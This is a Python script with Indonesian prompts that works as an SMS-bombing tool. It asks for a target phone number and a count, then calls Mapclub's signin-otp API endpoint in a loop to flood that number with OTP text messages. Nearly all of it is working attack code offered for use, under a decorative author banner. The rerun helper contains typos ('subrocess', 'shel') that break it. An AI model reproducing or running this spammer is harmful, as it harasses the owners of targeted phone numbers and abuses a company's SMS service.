import os, sys, time, requests
from requests import post
import subprocess

def bersih():
    os.system('clear')

def lagi():
    f = input('Mau Spam Lagi? (y/n) : ')
    if f == 'y':
       subrocess.call('python spam.py',shel=True)
    elif f == 'n':
         sys.exit()

bersih()
os.system('figlet Spam MCP | lolcat')
print ('\033[0;92m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ஜ۩۞۩ஜ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
print ('\033[0;90m[\033[0;96m•\033[0;90m] \033[0;96mAuthor     \033[0;91m: \033[0;93mRandiansyah')
print ('\033[0;90m[\033[0;96m•\033[0;90m] \033[0;96mInstagram  \033[0;91m: \033[0;93m@rendi_noober01')
print ('\033[0;90m[\033[0;96m•\033[0;90m] \033[0;96mGithub     \033[0;91m: \033[0;93mhttps://github.com/Rendi-ID')
print ('\033[0;90m[\033[0;96m•\033[0;90m] \033[0;96mJenis Spam \033[0;91m: \033[0;93mMapclub.com')
print ('\033[0;90m[\033[0;96m•\033[0;90m] \033[0;96mVersi Spam \033[0;91m: \033[0;93m3')
print ('\033[0;92m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
no = input('\033[0;96mMasukan Nomor Target Ente \033[0;91m:\033[0;93m ')
jml = int(input('\033[0;96mMasukan Jumlah Spam \033[0;93m: \033[0;93m '))

head = {
'Connection': 'keep-alive',
'User-Agent': 'Mozilla/5.0 (Linux; Android 5.1; A1603) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
}

dat = {
'phone': no,
}

for x in range(jml):
    r = requests.post('https://cmsapi.mapclub.com/api/signin-otp',headers=head, data=dat)
    print ('Spam Sms Berhasil')

bersih()
lagi()
